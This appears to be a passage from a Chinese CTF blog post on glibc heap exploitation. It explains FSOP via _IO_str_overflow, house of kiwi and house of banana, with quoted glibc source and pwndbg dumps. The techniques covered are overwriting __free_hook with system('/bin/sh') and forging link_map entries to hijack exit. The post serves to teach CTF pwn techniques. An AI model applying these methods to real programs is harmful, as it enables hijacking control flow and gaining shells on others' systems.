&amp; _IO_NO_WRITES)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> flush_only ? <span class=\"number\">0</span> : EOF;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class=\"line\">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (pos &gt;= (<span class=\"type\">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class=\"comment\">/* not allowed to enlarge */</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"type\">char</span> *new_buf;</span><br><span class=\"line\">\t  <span class=\"type\">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class=\"line\">\t  <span class=\"type\">size_t</span> old_blen = _IO_blen (fp);</span><br><span class=\"line\">\t  <span class=\"type\">size_t</span> new_size = <span class=\"number\">2</span> * old_blen + <span class=\"number\">100</span>;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (new_size &lt; old_blen)</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">\t  new_buf = <span class=\"built_in\">malloc</span> (new_size);</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (new_buf == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"comment\">/*\t  __ferror(fp) = 1; */</span></span><br><span class=\"line\">\t      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (old_buf)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"built_in\">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class=\"line\">\t      <span class=\"built_in\">free</span> (old_buf);</span><br><span class=\"line\">\t      <span class=\"comment\">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class=\"line\">\t      fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  <span class=\"built_in\">memset</span> (new_buf + old_blen, <span class=\"string\">&#x27;\\0&#x27;</span>, new_size - old_blen);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  _IO_setb (fp, new_buf, new_buf + new_size, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class=\"line\">\t  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class=\"line\">\t  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class=\"line\">\t  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  fp-&gt;_IO_write_base = new_buf;</span><br><span class=\"line\">\t  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!flush_only)</span><br><span class=\"line\">    *fp-&gt;_IO_write_ptr++ = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) c;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class=\"line\">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t2.34 前的版本中，我们在利用 FSOP 劫持_IO_list_all 的值来伪造链表和其中的 IO_FILE 项。</p>\n<p>​\t当程序执行 exit 函数，或者从 main 函数返回时，会执行调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。<br>\n因而当设置 stdout 对应的_IO_FILE 对应的 vtable 为 _IO_str_jumps<br>\n 执行 exit 就会执行，_IO_str_overflow,</p>\n<p>利用思路是根据这里面连续的 malloc,memcpy,free，通过控制、伪造 IO_FILE，我们要伪造一个 fake_chunk, 使得函数调用 malloc 时可以得到 fake_chunk, 然后再 fake_chunk 写入我们的数据（来自_IO_buf_base），一般我们把 free_hook 作为 fake_chunk 进行攻击，(这也是攻击陈工的前提)，将 free_hook 覆盖为 system, 执行 system (&quot;/bin/sh&quot;). 这里我们布置的时 fake_chunk 的用户区域为 free_hook-0x10, 这样，_IO_buf_base 的前 8 字节为”/bin/sh\\x00“, 接下来的 8 字节时 system 的地址，这样 free (fake_chunk) ===&gt;system (fakechunk), 完成了 free_hook 的覆盖以及 getshell。</p>\n<h4 id=\"house-of-kiwi\"><a class=\"markdownIt-Anchor\" href=\"#house-of-kiwi\">#</a> house of kiwi</h4>\n<p>当程序没有显示调用 exit，也不会通过主函数返回，那么以往我们使用的 FSOP 就无法进行了，如果此时两个 hook 也没法利用，我们需要一种能够稳定触发 IO 中函数的路径，这就是 house of kiwi, 它利用了__malloc_assert.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span></span><br><span class=\"line\">__malloc_assert (<span class=\"type\">const</span> <span class=\"type\">char</span> *assertion, <span class=\"type\">const</span> <span class=\"type\">char</span> *file, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> line,</span><br><span class=\"line\">\t\t <span class=\"type\">const</span> <span class=\"type\">char</span> *function)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  (<span class=\"type\">void</span>) __fxprintf (<span class=\"literal\">NULL</span>, <span class=\"string\">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n&quot;</span>,</span><br><span class=\"line\">\t\t     __progname, __progname[<span class=\"number\">0</span>] ? <span class=\"string\">&quot;: &quot;</span> : <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">\t\t     file, line,</span><br><span class=\"line\">\t\t     function ? function : <span class=\"string\">&quot;&quot;</span>, function ? <span class=\"string\">&quot;: &quot;</span> : <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">\t\t     assertion);</span><br><span class=\"line\">  fflush (<span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  <span class=\"built_in\">abort</span> ();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从源码中可以看到这个断言中调用了 fflush (stderr)，这个函数会稳定的调用_IO_file_jumps 中的 sync<br>\n 在 house of kiwi 中，如果我们能实现一个任意地址写，那么就可以修改 sync 指针，并且在调用的时候还发现，rdx 也很稳定的是 IO_helper_jumps，此时如果我们通过任意地址写将 sync 指针改成 IO_helper_jumps，且将 IO_helper_jumps+0xa0 和 IO_helper_jumps+0xa8 改写，就可以实现栈迁移 orw。在更新的版本中，相关的虚表已经不可以写了。</p>\n<h4 id=\"小结\"><a class=\"markdownIt-Anchor\" href=\"#小结\">#</a> 小结：</h4>\n<p>但是这些 2.34 更新的版本中（比如 glibcubuntu3.2）下都失效了，因为没有了 free_hook，也就没有了上述的一系列手法，而且以上依赖 fflush () 函数，通常我们需要利用 exit 函数来执行该调用。到此我们宣告上述利用手法，失效。但是比赛目前还没有变态到这种程度，常见的还是 2.34 的早期版本上述手法部分依旧可以实现。</p>\n<h2 id=\"解决方案\"><a class=\"markdownIt-Anchor\" href=\"#解决方案\">#</a> 解决方案</h2>\n<p>难道 pwn 到此就结束了吗？我们回头梳理下，以上攻击方式失败的原因，无外乎就是没有了 hook 函数以及 vtable 不可写。但是我们回到最开始学习 pwn，其实最简单的还是 rop, 在高版本中我们是否可以结合 stack 与 heap 的攻击？或者我们是否还有其他的办法劫持程序的控制流？</p>\n<h3 id=\"house-of-banana\"><a class=\"markdownIt-Anchor\" href=\"#house-of-banana\">#</a> house of banana</h3>\n<p>house of banana 是 ha1vk 师傅在 2020 年总结出来的利用链。不同于_IO_IO_str   和_overflow,_IO_str_overflow。banana 攻击的是 rtld_global 结构体中的 link_map 指针，</p>\n<p>攻击的位置 houm 是在程序结束后调用 exit，或者程序由 libc_start_main 启动，并且主函数可以正常结束返回。（这里提到了 exit，不得不提一下以往的攻击 exit_hook，配合 onegadget 获得 shell，目前为止，到 glibc2.34ubuntu3 依旧可以利用，但是在 3.2 版本下该地址没有了可写权限，所以失效了）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//2.34 0ubuntu3.2</span></span><br><span class=\"line\">RAX  <span class=\"number\">0x1</span></span><br><span class=\"line\"> RBX  <span class=\"number\">0x7ffff7fad9f8</span> (__elf_set___libc_atexit_element__IO_cleanup__) —▸ <span class=\"number\">0x7ffff7e26b10</span> (_IO_cleanup) ◂— endbr64 </span><br><span class=\"line\"> RCX  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RDX  <span class=\"number\">0x1</span></span><br><span class=\"line\"> RDI  <span class=\"number\">0x555555558148</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">```</span><br><span class=\"line\"><span class=\"number\">0x7ffff7ddd58f</span> &lt;__run_exit_handlers+<span class=\"number\">431</span>&gt;    nop    </span><br><span class=\"line\"> ► <span class=\"number\">0x7ffff7ddd590</span> &lt;__run_exit_handlers+<span class=\"number\">432</span>&gt;    call   qword ptr [rbx]               &lt;_IO_cleanup&gt;</span><br><span class=\"line\">        rdi: <span class=\"number\">0x555555558148</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">        rsi: <span class=\"number\">0x0</span></span><br><span class=\"line\">        rdx: <span class=\"number\">0x1</span></span><br><span class=\"line\">        rcx: <span class=\"number\">0x0</span></span><br><span class=\"line\">```</span><br><span class=\"line\">pwndbg&gt; vmmap <span class=\"number\">0x7ffff7fad9f8</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">    <span class=\"number\">0x7ffff7fad000</span>     <span class=\"number\">0x7ffff7fb1000</span> r--p     <span class=\"number\">4000</span> <span class=\"number\">214000</span> /usr/lib/x86_64-linux-gnu/libc.so<span class=\"number\">.6</span> +<span class=\"number\">0x9f8</span></span><br><span class=\"line\">pwndbg&gt; x <span class=\"number\">0x7ffff7fad9f8</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7fad9f8</span> &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;:\t<span class=\"number\">0xf7e26b10</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>house of banana 相较于以往的攻击手法，其实思路很明确。在程序通过显式调用 exit，或者 main 函数是由__libc_start_main 唤起，并可以正常的返回时，由于动态链接的加载机制，程序中并没有 exit 函数的真实调用，而是要通过符号表来获得真实的函数地址。（有关动态链接延迟绑定的技术，还请自行查阅，这里不做过多的阐述。）我们联想到 ret2_dl_resolve 技术。</p>\n<p>下面是 exit 执行的一个过程</p>\n<h5 id=\"exit-_dl_fini-fini_t-arrayi\"><a class=\"markdownIt-Anchor\" href=\"#exit-_dl_fini-fini_t-arrayi\">#</a> exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();</h5>\n<p>​\t\tbanana 手法，通过伪造修改相关的表项，以达到调用后门来获得权限。这里我们重点说一下，在 ubuntu3.2 下利用的可行性。大多数师傅对于 banana 的攻击方式主要有两种，一是攻击_rtld_global 这个全局符号所保存的 link_map 的链表。伪造整个链表，进行劫持。相关的全局变量是可以写的。后面会解释这个变量的用处。</p>\n<p><img data-src=\"p3.png\" alt=\"p3\"></p>\n<p>另外一个与之相比破坏性比较小，更容易成功。由于 link_map 通过链表链接，但是在加载 exit 的时候，相关函数智慧通过 link_map-&gt;l_next 指针进行相关的检查。我们可以在某个特定的位置，更改 next 指针，将下一以链表节点转为我们控制的地方，比如 heap 上。</p>\n<p>​\t很多朋友看了上面的可能会比较蒙，下面我具体说一参数。</p>\n<p>关于 link_map, 我们攻击 exit 时，会使用到一个 link_map 的链表，链表的一些信息保存在 struct rtld_global 结构体中，这个结构体信息很多，很繁杂，但是 banana 只用到了几个关键的点。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_rtld_global</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> rtld_global *) <span class=\"number\">0x7f56e43b9040</span> &lt;_rtld_global&gt;</span><br><span class=\"line\">    <span class=\"comment\">//以下是结构体信息的展开，pwndbg为我们做了整理</span></span><br><span class=\"line\">pwndbg&gt; p _rtld_global</span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  _dl_ns = &#123;&#123;</span><br><span class=\"line\">      _ns_loaded = <span class=\"number\">0x7f56e43ba220</span>,\t\t\t\t<span class=\"comment\">//#1</span></span><br><span class=\"line\">      _ns_nloaded = <span class=\"number\">4</span>,\t\t\t\t\t\t<span class=\"comment\">//#2</span></span><br><span class=\"line\">      _ns_main_searchlist = <span class=\"number\">0x7f56e43ba4e0</span>,</span><br><span class=\"line\">      _ns_global_scope_alloc = <span class=\"number\">0</span>,</span><br><span class=\"line\">      _ns_global_scope_pending_adds = <span class=\"number\">0</span>,</span><br><span class=\"line\">      libc_map = <span class=\"number\">0x7f56e4382000</span>,</span><br><span class=\"line\">      _ns_unique_sym_table = &#123;</span><br><span class=\"line\">        lock = &#123;</span><br><span class=\"line\">          mutex = &#123;</span><br><span class=\"line\">            __data = &#123;</span><br><span class=\"line\">              __lock = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __count = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __owner = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __nusers = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __kind = <span class=\"number\">1</span>,</span><br><span class=\"line\">              __spins = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __elision = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __list = &#123;</span><br><span class=\"line\">                __prev = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">                __next = <span class=\"number\">0x0</span></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            __size = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">16</span> times&gt;, <span class=\"string\">&quot;\\001&quot;</span>, <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">22</span> times&gt;,</span><br><span class=\"line\">            __align = <span class=\"number\">0</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">....    </span><br><span class=\"line\">  <span class=\"comment\">//展开数据会很多，但是只是对链表个节点信息的汇总</span></span><br></pre></td></tr></table></figure>\n<p>我们需要关注的是，</p>\n<p>​\t#1，_ns_loaded = 0x7f56e43ba220,\t这是整个链表的头节点，</p>\n<p>​\t#2， _ns_nloaded = 4, 这里知名个这个链表的节点个数，在 exit 后面加载的检查中，会要求_ns_nloaded 链表的节点不少于 3 个</p>\n<p>（后面我会给出相关的源码）</p>\n<p>然后对于每个节点，都是 link_map 结构体，我们利用第一个节点做一下简单说明 (省略了部分无关的数据)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> link_map *)<span class=\"number\">0x7f56e43ba220</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  l_addr = <span class=\"number\">94172888551424</span>,</span><br><span class=\"line\">  l_name = <span class=\"number\">0x7f56e43ba7c8</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">  l_ld = <span class=\"number\">0x55a655922000</span>,</span><br><span class=\"line\">  l_next = <span class=\"number\">0x7f56e43ba7d0</span>,\t\t\t<span class=\"comment\">//#3</span></span><br><span class=\"line\">  l_prev = <span class=\"number\">0x0</span>,\t\t\t\t\t\t\t</span><br><span class=\"line\">  l_real = <span class=\"number\">0x7f56e43ba220</span>,\t\t\t<span class=\"comment\">//#3</span></span><br><span class=\"line\">  l_ns = <span class=\"number\">0</span>,</span><br><span class=\"line\">  l_libname = <span class=\"number\">0x7f56e43ba7b0</span>,</span><br><span class=\"line\">  l_info = &#123;<span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922010</span>, <span class=\"number\">0x55a6559220f0</span>, <span class=\"number\">0x55a6559220e0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922090</span>, <span class=\"number\">0x55a6559220a0</span>, <span class=\"number\">0x55a655922120</span>, <span class=\"number\">0x55a655922130</span>, <span class=\"number\">0x55a655922140</span>, <span class=\"number\">0x55a6559220b0</span>, <span class=\"number\">0x55a6559220c0</span>, <span class=\"number\">0x55a655922020</span>, <span class=\"number\">0x55a655922030</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922100</span>, <span class=\"number\">0x55a6559220d0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922110</span>, <span class=\"number\">0x55a655922160</span>, <span class=\"number\">0x55a655922040</span>, <span class=\"number\">0x55a655922060</span>, <span class=\"number\">0x55a655922050</span>, <span class=\"number\">0x55a655922070</span>, <span class=\"number\">0x55a655922000</span>, <span class=\"number\">0x55a655922150</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922180</span>, <span class=\"number\">0x55a655922170</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922160</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a6559221a0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922190</span>, <span class=\"number\">0x0</span> &lt;repeats <span class=\"number\">25</span> times&gt;, <span class=\"number\">0x55a655922080</span>&#125;,\t\t\t<span class=\"comment\">//#4</span></span><br><span class=\"line\">  l_phdr = <span class=\"number\">0x55a65591d040</span>,</span><br><span class=\"line\">......</span><br><span class=\"line\">  l_direct_opencount = <span class=\"number\">1</span>,</span><br><span class=\"line\">  l_type = lt_executable,</span><br><span class=\"line\">  l_relocated = <span class=\"number\">1</span>,</span><br><span class=\"line\">  l_init_called = <span class=\"number\">1</span>,\t\t\t\t\t<span class=\"comment\">//#5</span></span><br><span class=\"line\">  l_global = <span class=\"number\">1</span>,</span><br><span class=\"line\">......</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们需要关注的：</p>\n<p>​\t#3，l_next = 0x7f56e43ba7d0, ，指向下一个 link_map 的指针，我们就是通过修改这个，将下一个节点劫持为我们伪造的 link_map</p>\n<p>​\t#4 , l_real = 0x7f56e43ba220 , 指向的的自身的地址，这里也是后面需要检查的地方。</p>\n<p>​\t#5,  l_init_called = 1, 简单说，就是为了绕过检查。</p>\n<p>下面是_dl_fini 函数的源码（我已经删除了部分注释及代码，源码路径为 glibc2.34/elf/dl-fini。c）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_dl_fini (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">...</span><br><span class=\"line\">\t  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">maps</span>[<span class=\"title\">nloaded</span>];</span>\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i;</span><br><span class=\"line\">\t  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">l</span>;</span></span><br><span class=\"line\">\t  assert (nloaded != <span class=\"number\">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t  <span class=\"keyword\">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class=\"number\">0</span>; l != <span class=\"literal\">NULL</span>; l = l-&gt;l_next)</span><br><span class=\"line\">\t    <span class=\"comment\">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (l == l-&gt;l_real)\t\t\t\t\t\t<span class=\"comment\">//检查节点的地址是否跟自己结构体保存的一致</span></span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\tassert (i &lt; nloaded);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmaps[i] = l;</span><br><span class=\"line\">\t\tl-&gt;l_idx = i;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class=\"line\"><span class=\"comment\">\t\t   are not dlclose()ed from underneath us.  */</span></span><br><span class=\"line\">\t\t++l-&gt;l_direct_opencount;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\">\t  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class=\"line\">\t  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class=\"number\">1</span>);</span><br><span class=\"line\">\t  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> nmaps = i;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class=\"line\">\t\t\t <span class=\"literal\">NULL</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; nmaps; ++i)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">l</span> =</span> maps[i];\t\t\t<span class=\"comment\">//l遍历link_map的链表</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (l-&gt;l_init_called)\t\t\t\t\t<span class=\"comment\">//重要的检查点</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  l-&gt;l_init_called = <span class=\"number\">0</span>;\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t  <span class=\"comment\">/* Is there a destructor function?  */</span></span><br><span class=\"line\">\t\t  <span class=\"keyword\">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class=\"literal\">NULL</span></span><br><span class=\"line\">\t\t      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\t    &#123;</span><br><span class=\"line\">\t\t      <span class=\"comment\">/* When debugging print a message first.  */</span></span><br><span class=\"line\">\t\t      <span class=\"keyword\">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class=\"line\">\t\t\t\t\t    &amp; DL_DEBUG_IMPCALLS, <span class=\"number\">0</span>))</span><br><span class=\"line\">\t\t\t_dl_debug_printf (<span class=\"string\">&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t  DSO_FILENAME (l-&gt;l_name),</span><br><span class=\"line\">\t\t\t\t\t  ns);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t      <span class=\"comment\">/* First see whether an array is given.  */</span></span><br><span class=\"line\">\t\t      <span class=\"keyword\">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t  ElfW(Addr) *<span class=\"built_in\">array</span> =</span><br><span class=\"line\">\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class=\"line\">\t\t\t\t\t    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class=\"line\">\t\t\t  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i = 